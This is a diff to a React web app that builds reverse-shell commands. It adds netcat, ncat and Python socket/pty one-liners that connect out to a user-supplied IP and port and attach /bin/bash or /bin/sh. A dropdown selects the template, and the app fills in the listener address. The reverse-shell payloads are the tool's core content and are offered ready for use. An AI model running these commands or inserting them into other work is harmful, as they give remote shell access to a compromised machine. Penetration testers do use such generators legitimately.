@@ -4,13 +4,27 @@ import Select from "react-select";
 const Countries = [
   { label: "nc", value: 1 },
   { label: "ncat", value: 2 },
-  { label: "python", value: 2 },
+  { label: "python", value: 3 },
+];
+const shells = [
+  {
+    id: 1,
+    shell: "nc 0.0.0.0 0000 -e /bin/bash",
+  },
+  {
+    id: 2,
+    shell: "ncat 0.0.0.0 0000 -e /bin/bash",
+  },
+  {
+    id: 3,
+    shell: `export RHOST="0.0.0.0";export RPORT=0000;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`,
+  },
 ];
 function App() {
   const [dark, setDark] = useState(true);
   const [ip, setIp] = useState("192.168.0.1");
   const [port, setPort] = useState("4444");
-
+  const [whichShell, setwhichShell] = useState(0);
   return (
     <div className={dark ? "dark" : "light"}>
       <div className="body">
@@ -68,19 +82,50 @@ function App() {
               <Select
                 style={{ color: dark ? "#fff" : "#000" }}
                 options={Countries}
-                // theme={(theme) => ({
-                //   ...theme,
-                //   borderRadius: 0,
-                //   colors: {
-                //     // ...theme.colors,
-                //     text: "#000",
-                //     primary25: "#aff",
-                //     // primary: "#000",
-                //     // color: "#000",
-                //   },
-                // })}
+                onChange={(e) => {
+                  // alert(e.value);
+                  setwhichShell(e.value - 1);
+                }}
+                theme={(theme) => ({
+                  ...theme,
+                  borderRadius: 0,
+                  colors: {
+                    // ...theme.colors,
+                    text: "#000",
+                    primary25: "#aff",
+                    // primary: "#000",
+                    // color: "#000",
+                  },
+                })}
               />
             </div>
+          </div>
+        </div>
+        <div
+          style={{
+            display: "flex",
+            // background: "red",
+            alignItems: "center",
+            justifyContent: "center",
+            flexDirection: "column",
+          }}
+        >
+          Shell
+          <div
+            style={{
+              width: "60vw",
+              background: "red",
+              opacity: 0.5,
+              borderRadius: 10,
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              flexWrap: "wrap",
+            }}
+          >
+            {shells[whichShell].shell
+              .replace("0.0.0.0", ip)
+              .replace("0000", port)}
           </div>
         </div>
       </div>
